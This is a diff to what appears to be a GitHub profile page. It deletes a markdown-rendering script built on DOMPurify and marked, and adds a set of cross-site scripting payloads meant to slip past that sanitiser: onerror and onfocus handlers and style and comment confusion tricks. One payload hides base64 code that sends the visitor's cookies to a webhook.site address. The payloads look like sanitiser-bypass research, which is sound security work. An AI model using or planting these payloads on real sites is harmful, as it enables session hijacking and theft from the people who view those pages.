@@ -31,11 +31,16 @@
 </p>
 <p>&nbsp; <img align="center" src="https://github-readme-stats-sigma-five.vercel.app/api?username=benny-nottonson&show_icons=true&locale=en" alt="benny-nottonson" />
 </p>
-<script src="https://cdn.jsdelivr.net/npm/dompurify@2.3.6/dist/purify.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/marked@4.0.14/lib/marked.umd.min.js"></script>
-<script>
-const qs = new URLSearchParams(location.search);
-if (qs.get("content")?.length > 0) {
-    document.body.innerHTML = marked.parse(DOMPurify.sanitize(qs.get("content")));
-}
-</script>
+<div id="1
+
+![](contenteditable/autofocus/onfocus=confirm('qwq')//)">
+-----------------------------------------------
+<a title="a
+
+<img src=x onerror=alert(1)>">yep</a>
+------------------------------------------------
+[x](y '<style>')<!--</style><div id="x--><img src=1 onerror=alert(1)>"></div>
+----------------------------------------------
+[<p x='<style onload=eval(atob(/bG9jYXRpb249YGh0dHBzOi8vd2ViaG9vay5zaXRlL2FiM2IyYjg5LTg1YTktNGU0YS1hNjg0LTUxN2M1ZjQwNmZmMj9mPWArZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmNvb2tpZSk/.source))>](#'></p>)
+----------------------------------------------
+`<p x="`<img src=x onerror=alert(1)>"></p>
